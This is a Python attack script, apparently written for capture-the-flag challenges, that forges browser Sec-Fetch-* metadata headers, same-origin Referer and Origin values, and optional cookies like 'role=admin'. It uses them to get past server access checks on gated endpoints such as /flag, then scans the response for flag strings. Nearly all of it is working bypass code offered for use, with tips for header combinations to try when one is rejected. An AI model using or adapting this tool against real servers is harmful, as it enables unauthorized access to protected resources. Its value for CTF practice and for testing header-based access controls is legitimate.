#!/usr/bin/env python3
# secfetch_replay.py -- replay a browser's fetch-metadata headers with curl-like GET.
#
# WHY: Some CTF endpoints (e.g. /flag) return 403 to a plain curl but 200 to a request
# that *looks like* a same-origin in-page fetch(). Servers gate on the Sec-Fetch-* headers
# (which browsers set and JS cannot forge) plus a same-origin Referer/Origin. You almost
# never need a live XSS or admin bot -- just forge those headers yourself.
#
# Proven on "Mirro-Code Revisited": GET /flag with
#   Sec-Fetch-Site: same-origin  +  Sec-Fetch-Dest: empty  +  same-origin Referer
# returned the flag that a normal request could not reach.
#
# Pure stdlib. Safe under `python3 -I`. Args only; no env/config reliance.
#
# Usage:
#   python3 -I secfetch_replay.py https://target.tld/flag
#   python3 -I secfetch_replay.py https://target.tld/flag --origin https://target.tld
#   python3 -I secfetch_replay.py https://target.tld/flag --cookie "role=admin" \
#       --referer https://target.tld/dashboard --header "X-Requested-With: XMLHttpRequest"
#   python3 -I secfetch_replay.py https://target.tld/flag --site none --dest document --mode navigate
#
# Tweak --site/--dest/--mode if same-origin/empty/cors is rejected; browsers send
#   top-level nav:  Site=none|same-origin  Dest=document  Mode=navigate
#   in-page fetch:  Site=same-origin        Dest=empty      Mode=cors
#   <img>/<script>: Dest=image|script       Mode=no-cors

import argparse
import re
import ssl
import sys
import urllib.error
import urllib.request
from urllib.parse import urlsplit

FLAG_RE = re.compile(rb"flag\{[^}\r\n]{0,200}\}", re.IGNORECASE)


def origin_of(url: str) -> str:
    p = urlsplit(url)
    if not p.scheme or not p.netloc:
        sys.exit(f"[!] not an absolute URL: {url!r}")
    return f"{p.scheme}://{p.netloc}"


def main() -> int:
    ap = argparse.ArgumentParser(
        description="Replay browser fetch-metadata (Sec-Fetch-*) headers to reach a gated endpoint."
    )
    ap.add_argument("url", help="target URL, e.g. https://host.tld/flag")
    ap.add_argument("--origin", help="same-origin value (default: derived from URL)")
    ap.add_argument("--referer", help="Referer to send (default: <origin>/)")
    ap.add_argument("--site", default="same-origin",
                    help="Sec-Fetch-Site (default: same-origin; try none/same-site/cross-site)")
    ap.add_argument("--dest", default="empty",
                    help="Sec-Fetch-Dest (default: empty; try document/script/image)")
    ap.add_argument("--mode", default="cors",
                    help="Sec-Fetch-Mode (default: cors; try navigate/no-cors)")
    ap.add_argument("--user", default="?1", help="Sec-Fetch-User (default: ?1)")
    ap.add_argument("--cookie", help="Cookie header, e.g. 'role=admin; session=...'")
    ap.add_argument("--method", default="GET", help="HTTP method (default: GET)")
    ap.add_argument("--data", help="request body (sets method POST if method is GET)")
    ap.add_argument("--header", action="append", default=[],
                    help="extra header 'Name: value' (repeatable)")
    ap.add_argument("--ua", default="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
                                    "(KHTML, like Gecko) Chrome/125.0 Safari/537.36",
                    help="User-Agent")
    ap.add_argument("--no-origin-header", action="store_true",
                    help="do not send the Origin header (some gates reject it on GET)")
    ap.add_argument("-k", "--insecure", action="store_true", help="skip TLS cert verification")
    ap.add_argument("--timeout", type=float, default=15.0)
    ap.add_argument("--max-body", type=int, default=20000, help="bytes of body to print")
    args = ap.parse_args()

    origin = args.origin or origin_of(args.url)
    referer = args.referer or (origin + "/")

    headers = {
        "User-Agent": args.ua,
        "Accept": "*/*",
        "Sec-Fetch-Site": args.site,
        "Sec-Fetch-Mode": args.mode,
        "Sec-Fetch-Dest": args.dest,
        "Sec-Fetch-User": args.user,
        "Referer": referer,
    }
    if not args.no_origin_header:
        headers["Origin"] = origin
    if args.cookie:
        headers["Cookie"] = args.cookie
    for h in args.header:
        if ":" not in h:
            sys.exit(f"[!] bad --header (want 'Name: value'): {h!r}")
        name, _, value = h.partition(":")
        headers[name.strip()] = value.strip()

    body = args.data.encode() if args.data is not None else None
    method = "POST" if (body is not None and args.method == "GET") else args.method

    ctx = None
    if args.insecure:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE

    req = urllib.request.Request(args.url, data=body, headers=headers, method=method)

    print(f"[*] {method} {args.url}")
    for k in ("Sec-Fetch-Site", "Sec-Fetch-Dest", "Sec-Fetch-Mode", "Referer", "Origin", "Cookie"):
        if k in headers:
            print(f"      {k}: {headers[k]}")

    try:
        resp = urllib.request.urlopen(req, timeout=args.timeout, context=ctx)
        status, raw, info = resp.status, resp.read(), resp.info()
    except urllib.error.HTTPError as e:   # 4xx/5xx still carry a useful body
        status, raw, info = e.code, e.read(), e.headers
    except urllib.error.URLError as e:
        sys.exit(f"[!] request failed: {e}")

    print(f"[*] HTTP {status}")
    for key in ("Content-Type", "Content-Length", "Location", "Set-Cookie"):
        val = info.get(key)
        if val:
            print(f"      {key}: {val}")

    text = raw[: args.max_body].decode("utf-8", "replace")
    print("--- body (truncated) ---")
    print(text)

    flags = sorted({m.decode("utf-8", "replace") for m in FLAG_RE.findall(raw)})
    print("--- flag scan ---")
    if flags:
        for f in flags:
            print(f"[+] FLAG: {f}")
        return 0
    print("[-] no flag{...} in body. Try other --site/--dest/--mode combos, "
          "add --cookie, or drop --no-origin-header / add it.")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
